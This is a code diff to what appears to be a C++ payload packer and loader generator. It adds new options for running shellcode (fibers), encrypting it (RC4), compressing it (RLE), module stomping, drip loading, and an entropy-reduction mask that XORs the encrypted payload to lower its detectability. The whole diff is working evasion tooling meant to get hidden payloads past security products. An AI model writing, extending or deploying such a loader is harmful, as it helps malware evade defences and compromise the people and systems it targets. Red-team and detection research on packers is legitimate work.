@@ -120,6 +120,7 @@ static std::vector<std::string> get_enabled_tags(const PackerConfig& cfg) {
         case ExecutionPrimitive::Thread:   tags.push_back("EXEC_THREAD"); break;
         case ExecutionPrimitive::APC:      tags.push_back("EXEC_APC"); break;
         case ExecutionPrimitive::Callback: tags.push_back("EXEC_CALLBACK"); break;
+        case ExecutionPrimitive::Fiber:    tags.push_back("EXEC_FIBER"); break;
     }
 
     // Syscall method
@@ -145,6 +146,7 @@ static std::vector<std::string> get_enabled_tags(const PackerConfig& cfg) {
         case CipherMode::AES_ECB: tags.push_back("CIPHER_AES_ECB"); break;
         case CipherMode::AES_CBC: tags.push_back("CIPHER_AES_CBC"); break;
         case CipherMode::XOR:     tags.push_back("CIPHER_XOR"); break;
+        case CipherMode::RC4:     tags.push_back("CIPHER_RC4"); break;
     }
 
     // Encoding
@@ -161,6 +163,7 @@ static std::vector<std::string> get_enabled_tags(const PackerConfig& cfg) {
         case CompressionMethod::None: tags.push_back("COMPRESS_NONE"); break;
         case CompressionMethod::Zlib: tags.push_back("COMPRESS_ZLIB"); break;
         case CompressionMethod::LZ4:  tags.push_back("COMPRESS_LZ4"); break;
+        case CompressionMethod::RLE:  tags.push_back("COMPRESS_RLE"); break;
     }
 
     // Evasion
@@ -208,6 +211,18 @@ static std::vector<std::string> get_enabled_tags(const PackerConfig& cfg) {
     if (cfg.block_dlls)            tags.push_back("BLOCK_DLLS");
     if (cfg.obfuscate)             tags.push_back("OBFUSCATE");
 
+    if (cfg.module_stomp) {
+        tags.push_back("MODULE_STOMP");
+    } else {
+        tags.push_back("STANDARD_ALLOC");
+    }
+    if (cfg.drip_load) {
+        tags.push_back("DRIP_LOAD");
+    } else {
+        tags.push_back("STANDARD_COPY");
+    }
+
+    if (cfg.entropy_reduce)        tags.push_back("ENTROPY_REDUCE");
     if (cfg.sleep_seconds > 0)     tags.push_back("SLEEP_IN_BETWEEN");
 
     return tags;
@@ -279,8 +294,16 @@ GeneratedStub generate_loader(const PackerConfig& cfg,
     inline_include(loader_src, "common.hpp.in", common_src);
     inline_include(loader_src, "evasion.hpp.in", evasion_src);
 
-    // Replace payload data
-    std::string payload_array = format_as_cpp_array(encrypted_payload, "payload");
+    // Replace payload data (apply entropy mask if enabled)
+    std::vector<uint8_t> final_payload = encrypted_payload;
+    if (cfg.entropy_reduce) {
+        auto mask = generate_entropy_mask(encrypted_payload.size(), cfg.obf_seed ^ 0xDEADBEEF);
+        for (size_t i = 0; i < final_payload.size(); i++)
+            final_payload[i] ^= mask[i];
+        std::string mask_array = format_as_cpp_array(mask, "entropy_mask");
+        loader_src = replace_all(loader_src, "{{ENTROPY_MASK}}", mask_array);
+    }
+    std::string payload_array = format_as_cpp_array(final_payload, "payload");
     loader_src = replace_all(loader_src, "{{ENCRYPTED_PAYLOAD}}", payload_array);
 
     // Replace key data
